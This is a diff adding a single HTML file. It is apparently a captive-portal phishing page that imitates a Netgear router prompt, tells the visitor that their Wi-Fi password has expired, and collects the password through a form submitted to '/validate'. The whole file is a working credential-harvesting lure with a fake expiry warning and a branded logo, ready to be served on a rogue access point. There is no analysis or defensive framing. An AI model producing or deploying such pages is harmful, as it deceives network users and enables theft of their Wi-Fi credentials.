@@ -1,0 +1,103 @@
+<html>
+<head>
+    <meta name='viewport' content='width=device-width,
+    initial-scale=0.75, maximum-scale=0.75, user-scalable=no'>
+    <title>Update netgear WiFi Password</title>
+    <style>
+        button {
+            color: #ffffff;
+            background-color: #531c5d;
+            font-size: 15px;
+            border: 1px solid #531c5d;
+            border-radius: 10px;
+            padding: 10px 30px;
+            cursor: pointer
+        }
+
+        button:hover {
+            color: #ffffff;
+            background-color: #531c5d;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+
+        .container {
+            width: 360px;
+            padding: 8% 0 0;
+            margin: auto;
+            align-items: center;
+            text-align: center;
+            max-width: 400px;
+            justify-content: center;
+        }
+
+        h1 {
+            margin: 40px 0;
+        }
+
+        p {
+            margin: 10px 0;
+        }
+
+        form {
+            text-align: left;
+            padding: 20px;
+            border: 1px solid #cecece;
+            border-radius: 4px;
+        }
+
+        label {
+            display: block;
+            margin: 10px 0;
+        }
+
+        input[type=text], input[type=password] {
+            width: 100%;
+            padding: 12px 20px;
+            margin: 8px 0;
+            box-sizing: border-box;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+
+        input[type=submit] {
+            width: 100%;
+            background-color: #4CAF50;
+            color: white;
+            padding: 14px 20px;
+            margin: 8px 0;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        input[type=submit]:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+<div class=container>
+    <img src=data:image/png;base64,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 width="100" height="100" Router>
+    <h1>WiFi Password expired!</h1>
+    <p>Your Wi-Fi password has expired. Re-enter the Wi-Fi password to continue using the internet.</p>
+    <div class='login-page'>
+        <div class='form'>
+            <form class='login-form' action='/validate' method='GET'>
+                <div class='circle-mask'></div>
+                <input id='g' type='password' placeholder='Password' name='pass' required/>
+                <input type='hidden' name='url' value='google.com' style=display:block; margin: 0 auto;>
+                <div id='l' style="text-align:center" type='submit'>
+                    <button>Submit</button>
+                </div>
+            </form>
+        </div>
+    </div>
+</div>
+</body>
+
+</html>
